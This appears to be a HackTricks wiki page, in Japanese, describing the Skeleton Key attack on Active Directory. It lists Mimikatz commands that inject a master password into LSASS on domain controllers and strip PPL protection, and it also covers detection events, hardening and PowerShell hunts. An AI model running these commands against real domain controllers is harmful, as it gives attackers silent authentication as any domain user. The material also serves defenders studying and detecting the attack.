# Skeleton Key

{{#include ../../banners/hacktricks-training.md}}

## Skeleton Key Attack

**Skeleton Key attack** は、各ドメインコントローラーの LSASS プロセスに **master password** を **inject** することで、攻撃者が **Active Directory authentication を bypass** できる technique です。inject 後は、ユーザーの実際の password が引き続き有効なまま、master password（デフォルトは **`mimikatz`**）を使用して **any domain user** として authenticate できます。<sup>[[1]](#references)[[2]](#references)</sup>

Key facts:

- すべての DC 上で **Domain Admin/SYSTEM + SeDebugPrivilege** が必要で、**各 reboot 後に再適用**する必要があります。<sup>[[2]](#references)</sup>
- **NTLM** と **Kerberos RC4 (etype 0x17)** の validation paths に patch を適用します。AES-only realms または AES を強制する accounts では、**skeleton key は受け入れられません**。<sup>[[2]](#references)</sup>
- third-party LSA authentication packages や、追加の smart-card / MFA providers と競合する可能性があります。<sup>[[2]](#references)</sup>
- Mimikatz module は optional switch `/letaes` を受け付けます。これにより、compatibility issues が発生した場合に Kerberos/AES hooks への変更を回避できます。<sup>[[3]](#references)</sup>

### Execution

Classic、non‑PPL protected LSASS:
```text
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
**LSASS が PPL として実行されている場合**（RunAsPPL/Credential Guard/Windows 11 Secure LSASS）、LSASS にパッチを適用する前に保護を解除するためのカーネルドライバーが必要です:<sup>[[3]](#references)</sup>
```text
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
mimikatz # misc::skeleton                               # inject master password 'mimikatz'
```
Injection 後、任意のドメインアカウントで認証しますが、パスワードには `mimikatz`（またはオペレーターが設定した値）を使用します。複数の DC がある環境では、**すべての DC** で繰り返すことを忘れないでください。

## 緩和策

- **ログ監視**
- 未署名ドライバー（`mimidrv.sys` など）のサービスまたはドライバーインストールを示す System **Event ID 7045**。
- **Sysmon**: `mimidrv.sys` のドライバー読み込みに対する Event ID 7、およびシステムプロセス以外からの `lsass.exe` への疑わしいアクセスに対する Event ID 10。
- 機密性の高い特権の使用または LSA authentication package 登録の異常を示す Security **Event ID 4673/4611**。DC から RC4（etype 0x17）を使用した予期しない 4624 ログオンと関連付けます。
- **LSASS の hardening**
- DC で **RunAsPPL/Credential Guard/Secure LSASS** を有効にしておき、攻撃者を kernel-mode driver のデプロイに追い込みます（より多くの telemetry が得られ、exploit が困難になります）。
- 可能な場合は legacy **RC4** を無効化します。AES に限定された Kerberos tickets により、skeleton key が使用する RC4 hook path を防止できます。<sup>[[2]](#references)</sup>
- 簡易的な PowerShell hunts:
- 未署名 kernel driver のインストールを検出: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
- Mimikatz driver を hunt: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
- reboot 後に PPL が強制されていることを検証: `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`

追加の credential-hardening guidance については、[Windows credentials protections](../stealing-credentials/credentials-protections.md) を確認してください。

## References

- [1] [Netwrix – Skeleton Key attack in Active Directory (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
- [2] [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [3] [TheHacker.Tools – Mimikatz misc::skeleton module](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)

{{#include ../../banners/hacktricks-training.md}}
